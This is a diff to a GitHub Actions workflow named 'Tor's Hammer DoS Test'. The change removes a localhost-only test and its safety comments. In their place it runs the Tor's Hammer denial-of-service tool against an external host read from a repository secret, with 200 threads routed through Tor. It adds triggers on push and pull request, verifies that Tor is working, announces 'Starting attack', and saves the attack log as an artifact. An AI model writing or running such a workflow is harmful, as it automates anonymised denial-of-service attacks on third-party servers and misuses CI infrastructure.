@@ -3,11 +3,14 @@ name: Tor's Hammer DoS Test
 on:
   push:
     branches: [ main ]
-  workflow_dispatch:  # Allows manual trigger from GitHub UI
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:  # Manual run button
 
 jobs:
   test:
     runs-on: ubuntu-latest
+    timeout-minutes: 10  # Prevent hanging
 
     steps:
     - name: Checkout code
@@ -21,31 +24,36 @@ jobs:
     - name: Install dependencies
       run: |
         pip install pysocks requests
-        sudo apt-get update
+        sudo apt-get update -qq
         sudo apt-get install -y tor
 
-    - name: Start Tor (for anonymity)
+    - name: Start Tor service
       run: |
         sudo service tor start
-        sleep 5  # Wait for Tor to initialize
+        echo "Waiting for Tor to start..."
+        sleep 10
+        # Verify Tor is running
+        curl --socks5-hostname 127.0.0.1:9050 -s https://check.torproject.org/api/ip | grep -q '"IsTor":true' && echo "Tor is working!" || echo "Tor failed!"
 
     - name: Run Tor's Hammer
       run: |
-        # IMPORTANT: Replace with YOUR OWN test target (e.g., localhost or a dev server you control)
-        # Example for local test (start a server in the VM):
-        python3 -m http.server 8000 --bind 127.0.0.1 &
-        sleep 2  # Give server time to start
-        python3 torshammer.py -s 127.0.0.1 -p 8000 -r 100  # No -T for simplicity in VM
-        # For external: python3 torshammer.py -s ${{ secrets.TEST_TARGET }} -p 80 -r 200 -T
-      env:
-        TARGET: ${{ secrets.TEST_TARGET }}  # Optional: Set in Repo Settings > Secrets
+        # Fail fast if no target
+        if [ -z "${{ secrets.TEST_TARGET }}" ]; then
+          echo "ERROR: TEST_TARGET secret not set!"
+          echo "Go to Settings > Secrets > Actions and add TEST_TARGET with your domain/IP"
+          exit 1
+        fi
 
-    - name: Upload logs as artifact (if generated)
+        echo "Starting attack on ${{ secrets.TEST_TARGET }}:80 with 200 threads via Tor..."
+        python3 torshammer.py -s ${{ secrets.TEST_TARGET }} -p 80 -r 200 -T > hammer-attack.log 2>&1 || true
+
+        echo "Attack completed. Log saved."
+        cat hammer-attack.log
+
+    - name: Upload Attack Log
       if: always()
       uses: actions/upload-artifact@v4
       with:
-        name: dos-logs
-        path: |
-          *.log
-          torshammer*.out  # Adjust based on tool's output files
-        retention-days: 1  # Keep short for temp tests
+        name: torshammer-attack-log
+        path: hammer-attack.log
+        retention-days: 7
